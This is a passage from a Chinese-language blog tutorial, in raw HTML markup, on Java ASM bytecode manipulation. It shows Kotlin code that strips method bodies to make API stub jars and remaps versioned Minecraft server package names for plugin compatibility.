comment\">/**\n * org.example.asmlearn.ApiJarGenerator\n * asm-learn\n *\n * @author 寒雨\n * @since 2022/7/11 14:22\n */</span>\n<span class=\"token keyword\">fun</span> <span class=\"token function\">generate</span><span class=\"token punctuation\">(</span>sourceJar<span class=\"token operator\">:</span> File<span class=\"token punctuation\">,</span> output<span class=\"token operator\">:</span> File<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>output<span class=\"token punctuation\">.</span><span class=\"token function\">exists</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        output<span class=\"token punctuation\">.</span><span class=\"token function\">createNewFile</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token function\">JarOutputStream</span><span class=\"token punctuation\">(</span>output<span class=\"token punctuation\">.</span><span class=\"token function\">outputStream</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">use</span> <span class=\"token punctuation\">{</span> <span class=\"token keyword\">out</span> <span class=\"token operator\">-&gt;</span>\n        <span class=\"token function\">JarFile</span><span class=\"token punctuation\">(</span>sourceJar<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">use</span> <span class=\"token punctuation\">{</span> jarFile <span class=\"token operator\">-&gt;</span>\n            <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>jarEntry <span class=\"token keyword\">in</span> jarFile<span class=\"token punctuation\">.</span><span class=\"token function\">entries</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                jarFile<span class=\"token punctuation\">.</span><span class=\"token function\">getInputStream</span><span class=\"token punctuation\">(</span>jarEntry<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">use</span> <span class=\"token punctuation\">{</span> input <span class=\"token operator\">-&gt;</span>\n                    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>jarEntry<span class=\"token punctuation\">.</span>name<span class=\"token punctuation\">.</span><span class=\"token function\">endsWith</span><span class=\"token punctuation\">(</span><span class=\"token string\">\".class\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                        <span class=\"token comment\">// 如果是class文件，就用我们自定义的ClassVisitor visit它</span>\n                        <span class=\"token keyword\">val</span> classReader <span class=\"token operator\">=</span> <span class=\"token function\">ClassReader</span><span class=\"token punctuation\">(</span>input<span class=\"token punctuation\">)</span>\n                        <span class=\"token keyword\">val</span> classWriter <span class=\"token operator\">=</span> <span class=\"token function\">ClassWriter</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n                        <span class=\"token keyword\">val</span> visitor <span class=\"token operator\">=</span> <span class=\"token function\">EmptyClassVisitor</span><span class=\"token punctuation\">(</span>classWriter<span class=\"token punctuation\">)</span>\n                        classReader<span class=\"token punctuation\">.</span><span class=\"token function\">accept</span><span class=\"token punctuation\">(</span>visitor<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n                        <span class=\"token keyword\">out</span><span class=\"token punctuation\">.</span><span class=\"token function\">putNextEntry</span><span class=\"token punctuation\">(</span><span class=\"token function\">JarEntry</span><span class=\"token punctuation\">(</span>jarEntry<span class=\"token punctuation\">.</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n                        <span class=\"token comment\">// 写入class文件</span>\n                        <span class=\"token keyword\">out</span><span class=\"token punctuation\">.</span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span>classWriter<span class=\"token punctuation\">.</span><span class=\"token function\">toByteArray</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n                    <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span>\n                        <span class=\"token keyword\">out</span><span class=\"token punctuation\">.</span><span class=\"token function\">putNextEntry</span><span class=\"token punctuation\">(</span><span class=\"token function\">JarEntry</span><span class=\"token punctuation\">(</span>jarEntry<span class=\"token punctuation\">.</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n                        input<span class=\"token punctuation\">.</span><span class=\"token function\">copyTo</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">out</span><span class=\"token punctuation\">)</span>\n                    <span class=\"token punctuation\">}</span>\n                <span class=\"token punctuation\">}</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token function\">EmptyClassVisitor</span><span class=\"token punctuation\">(</span>visitor<span class=\"token operator\">:</span> ClassVisitor<span class=\"token punctuation\">)</span> <span class=\"token operator\">:</span> <span class=\"token function\">ClassVisitor</span><span class=\"token punctuation\">(</span>ASM9<span class=\"token punctuation\">,</span> visitor<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitMethod</span><span class=\"token punctuation\">(</span>\n        access<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">,</span>\n        name<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span>\n        descriptor<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span>\n        signature<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span>\n        exceptions<span class=\"token operator\">:</span> Array<span class=\"token operator\">&lt;</span><span class=\"token keyword\">out</span> String<span class=\"token operator\">&gt;</span><span class=\"token operator\">?</span>\n    <span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> MethodVisitor <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> <span class=\"token function\">EmptyMethodVisitor</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">super</span><span class=\"token punctuation\">.</span><span class=\"token function\">visitMethod</span><span class=\"token punctuation\">(</span>access<span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">,</span> descriptor<span class=\"token punctuation\">,</span> signature<span class=\"token punctuation\">,</span> exceptions<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token function\">EmptyMethodVisitor</span><span class=\"token punctuation\">(</span>methodVisitor<span class=\"token operator\">:</span> MethodVisitor<span class=\"token punctuation\">)</span> <span class=\"token operator\">:</span> <span class=\"token function\">MethodVisitor</span><span class=\"token punctuation\">(</span>ASM9<span class=\"token punctuation\">,</span> methodVisitor<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitIincInsn</span><span class=\"token punctuation\">(</span>`<span class=\"token keyword\">var</span>`<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">,</span> increment<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitInsn</span><span class=\"token punctuation\">(</span>opcode<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitIntInsn</span><span class=\"token punctuation\">(</span>opcode<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">,</span> operand<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitVarInsn</span><span class=\"token punctuation\">(</span>opcode<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">,</span> `<span class=\"token keyword\">var</span>`<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitTypeInsn</span><span class=\"token punctuation\">(</span>opcode<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">,</span> type<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitJumpInsn</span><span class=\"token punctuation\">(</span>opcode<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">,</span> label<span class=\"token operator\">:</span> Label<span class=\"token operator\">?</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitLabel</span><span class=\"token punctuation\">(</span>label<span class=\"token operator\">:</span> Label<span class=\"token operator\">?</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitLdcInsn</span><span class=\"token punctuation\">(</span>value<span class=\"token operator\">:</span> Any<span class=\"token operator\">?</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitTableSwitchInsn</span><span class=\"token punctuation\">(</span>min<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">,</span> max<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">,</span> dflt<span class=\"token operator\">:</span> Label<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">vararg</span> labels<span class=\"token operator\">:</span> Label<span class=\"token operator\">?</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitLookupSwitchInsn</span><span class=\"token punctuation\">(</span>dflt<span class=\"token operator\">:</span> Label<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span> keys<span class=\"token operator\">:</span> IntArray<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span> labels<span class=\"token operator\">:</span> Array<span class=\"token operator\">&lt;</span><span class=\"token keyword\">out</span> Label<span class=\"token operator\">&gt;</span><span class=\"token operator\">?</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitMultiANewArrayInsn</span><span class=\"token punctuation\">(</span>descriptor<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span> numDimensions<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitTryCatchBlock</span><span class=\"token punctuation\">(</span>start<span class=\"token operator\">:</span> Label<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span> end<span class=\"token operator\">:</span> Label<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span> handler<span class=\"token operator\">:</span> Label<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span> type<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitLocalVariable</span><span class=\"token punctuation\">(</span>name<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span> descriptor<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span> signature<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span> start<span class=\"token operator\">:</span> Label<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span> end<span class=\"token operator\">:</span> Label<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span> index<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitLineNumber</span><span class=\"token punctuation\">(</span>line<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">,</span> start<span class=\"token operator\">:</span> Label<span class=\"token operator\">?</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitFrame</span><span class=\"token punctuation\">(</span>type<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">,</span> numLocal<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">,</span> local<span class=\"token operator\">:</span> Array<span class=\"token operator\">&lt;</span><span class=\"token keyword\">out</span> Any<span class=\"token operator\">&gt;</span><span class=\"token operator\">?</span><span class=\"token punctuation\">,</span> numStack<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">,</span> stack<span class=\"token operator\">:</span> Array<span class=\"token operator\">&lt;</span><span class=\"token keyword\">out</span> Any<span class=\"token operator\">&gt;</span><span class=\"token operator\">?</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitFieldInsn</span><span class=\"token punctuation\">(</span>opcode<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">,</span> owner<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span> name<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span> descriptor<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitMethodInsn</span><span class=\"token punctuation\">(</span>opcode<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">,</span> owner<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span> name<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span> descriptor<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitMethodInsn</span><span class=\"token punctuation\">(</span>opcode<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">,</span> owner<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span> name<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span> descriptor<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span> isInterface<span class=\"token operator\">:</span> Boolean<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitInvokeDynamicInsn</span><span class=\"token punctuation\">(</span>name<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span> descriptor<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span> bootstrapMethodHandle<span class=\"token operator\">:</span> Handle<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">vararg</span> bootstrapMethodArguments<span class=\"token operator\">:</span> Any<span class=\"token operator\">?</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">fun</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token function\">generate</span><span class=\"token punctuation\">(</span>\n        <span class=\"token function\">File</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"C:\\\\Users\\\\Rain\\\\Desktop\\\\recaf-2.21.13-J8-jar-with-dependencies.jar\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> \t\t                         <span class=\"token function\">File</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"C:\\\\Users\\\\Rain\\\\Desktop\\\\recaf-empty.jar\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>上面我们让EmptyClassVisitor在visitMethod返回了一个我们自定义的EmptyMethodVisitor，也就是说在访问方法时执行的是在EmptyMethodVisitor中我们自定义的逻辑。而在EmptyMethodVisitor中我们重写了所有方法，把原本的执行父类方法的逻辑删除。这样在访问时便不会想原本一样生成跟之前一样的字节码，而是什么都不做，这样就删掉了方法中方法体的字节码。</p>\n<h5 id=\"ASMVersionControl\"><a href=\"#ASMVersionControl\" class=\"headerlink\" title=\"ASMVersionControl\"></a>ASMVersionControl</h5><blockquote>\n<p>这是在Minecraft服务端插件开发经常中遇见的问题</p>\n<p>众所周知，目前主流的minecraft服务端都是第三方反编译官方服务端的代码后对其进行封装而来的，而作为服务端插件开发者，我们大部分时候只需要用到第三方封装的API，但也有例外。</p>\n<p>当我们需要调用官方服务端的代码，我们会发现一个问题：不同版本的服务端的官方服务端代码的包名不一样，它们被版本号分隔开来。</p>\n<p>比如，在Minecraft 1.16.5版本的官方代码中，所有类都在<code>net.minecraft.server.v1_16_R3</code>包下</p>\n<p>但在Minecraft 1.12.2版本的代码中，所有类都在<code>net.minecraft.server.v1_12_R1</code>包下</p>\n<p>关键是它们之间的代码其实没有很大的改动，就是包名不一样了</p>\n<p>考虑到版本兼容问题，开发者一般不会直接调用<code>n.m.s</code>包下的代码，在ASMVersionControl这个解决方案诞生之前，一般有两种解决方案</p>\n<ul>\n<li>运行时获取版本号，然后拼接字符串通过反射调用</li>\n<li>为不同版本写多份代码，再在运行时判断当前运行版本来决定调用哪一份</li>\n</ul>\n<p>这两种解决方案都不太尽人意。反射调用不仅麻烦，还会导致额外的性能开销。而编写多份代码更是白白增加了开发者的工作量，而且需要导入多个版本的服务端核心依赖，导包的时候及其容易导错。</p>\n<p>这时候<code>ASMVersionControl</code>应运而生，开发者只需要在一个实现类中写一份代码，便可以通过ASM动态代理得到一个实例。开发者可以放心调用实例中的方法，因为这个实例已经被asm修改过了，所有<code>n.m.s</code>调用的包名的版本号部分全部被修改为了运行环境的版本号。</p>\n</blockquote>\n<p>这部分逻辑其实ASM已经提供了一个现成的工具<code>ClassRemapper</code>来实现，但它本质上也是一个被封装过的<code>ClassVisitor</code>，为了方便理解，我们使用ClassVisitor实现。</p>\n<p>如果你想知道使用ClassRemapper如何实现，看这里<a href=\"https://github.com/TabooLib/taboolib/blob/master/module/module-nms/src/main/kotlin/taboolib/module/nms/MinecraftRemapper.kt\">taboolib/MinecraftRemapper.kt at master · TabooLib/taboolib (github.com)</a></p>\n<p>或者你也可以试着自己实现一下ClassRemapper的封装，比较简单。</p>\n<p>我们先模拟两个“不同版本”下的类，也就是包名不同，但方法声明相同，实现略有不同的两个类。</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token comment\">// net.minecraft.server.v1_12_R1</span>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Test</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">test</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"execute successfully v1.12\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token comment\">// net.minecraft.server.v1_16_R3</span>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Test</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">test</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"execute successfully v1.16\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>理想的状态是，我要让我调用<code>net.minecraft.server.v1_12_R1</code>的所有方法全部变成<code>net.minecraft.server.v1_16_R3</code>。</p>\n<p>我们先写一段伪代码</p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">import</span> net<span class=\"token punctuation\">.</span>minecraft<span class=\"token punctuation\">.</span>server<span class=\"token punctuation\">.</span>v1_12_R1<span class=\"token punctuation\">.</span>Test\n\n<span class=\"token keyword\">interface</span> NMSHandler <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">fun</span> <span class=\"token function\">callTest</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">class</span> NMSHandlerImpl <span class=\"token operator\">:</span> NMSHandler <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">callTest</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token function\">Test</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">test</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">fun</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token comment\">// 获得asm修改过的代理对象</span>\n    <span class=\"token keyword\">val</span> nmsProxy<span class=\"token operator\">:</span> NMSHandler <span class=\"token operator\">=</span> createProxyInstance<span class=\"token operator\">&lt;</span>NMSHandler<span class=\"token operator\">&gt;</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    nmsProxy<span class=\"token punctuation\">.</span><span class=\"token function\">callTest</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// 这里输出 execute successfully v1.16, 说明我们修改成功了</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>我们先看看<code>NMSHandlerImpl#callTest</code>的字节码指令</p>\n<blockquote>\n<p>   L0<br>    LINENUMBER 85 L0<br>    NEW net/minecraft/server/v1_12_R1/Test<br>    DUP<br>    INVOKESPECIAL net/minecraft/server/v1_12_R1/Test.<init> ()V<br>    INVOKEVIRTUAL net/minecraft/server/v1_12_R1/Test.test ()V<br>   L1<br>    LINENUMBER 86 L1<br>    RETURN<br>   L2<br>    LOCALVARIABLE this Lorg/example/asmlearn/NMSHandlerImpl; L0 L2 0<br>    MAXSTACK = 2<br>    MAXLOCALS = 1</init></p>\n</blockquote>\n<p>我们只需要修改其中所有的 <code>net/minecraft/server/v1_12_R1/Test</code>为<code>net/minecraft/server/v1_16_R3/Test</code>即可，目前为止我们知道我们肯定首先要先visitMethod，然后在具体的操作方法。</p>\n<blockquote>\n<p>需要修改的指令：</p>\n<ul>\n<li><p>NEW net/minecraft/server/v1_12_R1/Test</p>\n</li>\n<li><p>INVOKESPECIAL net/minecraft/server/v1_12_R1/Test.<init> ()V</init></p>\n</li>\n<li><p>INVOKEVIRTUAL net/minecraft/server/v1_12_R1/Test.test ()V</p>\n</li>\n</ul>\n</blockquote>\n<p>在<a href=\"https://www.bilibili.com/read/cv13433468\">Java ASM详解：MethodVisitor和Opcode（二）类型、数组、字段、方法、异常与同步 - 哔哩哔哩 (bilibili.com)</a>对照</p>\n<p>发现我们只需要重写<code>visitTypeInsn</code>, <code>visitMethodInsn</code>，并在里面替换对应的参数即可。</p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">class</span> <span class=\"token function\">VersionControlMethodVisitor</span><span class=\"token punctuation\">(</span>methodVisitor<span class=\"token operator\">:</span> MethodVisitor<span class=\"token punctuation\">,</span> <span class=\"token keyword\">private</span> <span class=\"token keyword\">val</span> currentVersion<span class=\"token operator\">:</span> String<span class=\"token punctuation\">)</span> <span class=\"token operator\">:</span> <span class=\"token function\">MethodVisitor</span><span class=\"token punctuation\">(</span>ASM9<span class=\"token punctuation\">,</span> methodVisitor<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitTypeInsn</span><span class=\"token punctuation\">(</span>opcode<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">,</span> type<span class=\"token operator\">:</span> String<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">super</span><span class=\"token punctuation\">.</span><span class=\"token function\">visitTypeInsn</span><span class=\"token punctuation\">(</span>opcode<span class=\"token punctuation\">,</span> type<span class=\"token punctuation\">.</span><span class=\"token function\">modifyVersion</span><span class=\"token punctuation\">(</span>currentVersion<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitMethodInsn</span><span class=\"token punctuation\">(</span>\n        opcode<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">,</span>\n        owner<span class=\"token operator\">:</span> String<span class=\"token punctuation\">,</span>\n        name<span class=\"token operator\">:</span> String<span class=\"token punctuation\">,</span>\n        descriptor<span class=\"token operator\">:</span> String<span class=\"token punctuation\">,</span>\n        isInterface<span class=\"token operator\">:</span> Boolean\n    <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">super</span><span class=\"token punctuation\">.</span><span class=\"token function\">visitMethodInsn</span><span class=\"token punctuation\">(</span>opcode<span class=\"token punctuation\">,</span> owner<span class=\"token punctuation\">.</span><span class=\"token function\">modifyVersion</span><span class=\"token punctuation\">(</span>currentVersion<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">,</span> descriptor<span class=\"token punctuation\">,</span> isInterface<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>完整代码如下:</p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">import</span> net<span class=\"token punctuation\">.</span>minecraft<span class=\"token punctuation\">.</span>server<span class=\"token 